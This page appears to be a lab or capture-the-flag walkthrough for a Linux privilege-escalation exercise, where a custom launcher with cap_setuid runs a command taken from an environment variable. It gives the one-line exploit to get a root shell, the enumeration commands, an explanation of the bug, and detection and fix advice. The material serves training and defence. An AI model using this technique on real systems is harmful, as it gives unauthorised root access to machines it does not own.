# C05 · Station E — cap_setuid on a launcher · ★★☆☆

> **Chapter:** [[Chapter-05-Overview]] · **Next:** [[Chapter-06-Overview]]
> **Host:** `hollow-vault-01` (`target-caps`) · **Binary:** `/usr/local/bin/svc-runner`
> **The bug:** a custom launcher with `cap_setuid=ep` runs `$SVC_CMD` after `setuid(0)`.

---

## 1. Exploit — do this first

```bash
SVC_CMD=/bin/bash svc-runner
id ; cat /root/flag.txt
```

---

## 2. How you find it

```bash
getcap -r / 2>/dev/null | grep setuid
# /usr/local/bin/svc-runner cap_setuid=ep
strings /usr/local/bin/svc-runner | grep -i SVC_CMD   # it reads an env var
svc-runner                                            # default runs `id` as root
```

## 3. Why it works

`svc-runner` uses its capability "correctly" — it calls `setuid(0)` to become
root — but then executes a command from the attacker-controlled `SVC_CMD`
environment variable (`system(getenv("SVC_CMD"))`). Even a proper privilege
raise is a root shell if the program then runs *your* input. It's the
capability cousin of PATH hijacking and `LD_PRELOAD` abuse.

## 4. Pitfalls

- If `SVC_CMD` is unset it runs `/usr/bin/id` — set it to a shell.

## 5. Detect & fix

- **Detect:** read/`strings` any capped custom binary for `system`/`exec*`/`popen` on argv or environment.
- **Fix:** `execve` a fixed absolute program with a sanitized environment (`clearenv`), and drop the capability after the privileged step. [[Blue-Team-Playbook]].

## 6. What you learned

- A correctly-used capability is still a bug if control flows to attacker input.

> Next chapter: [[Chapter-06-Overview]] · Related: [[C03-Station-C-LD_PRELOAD-env_keep]]
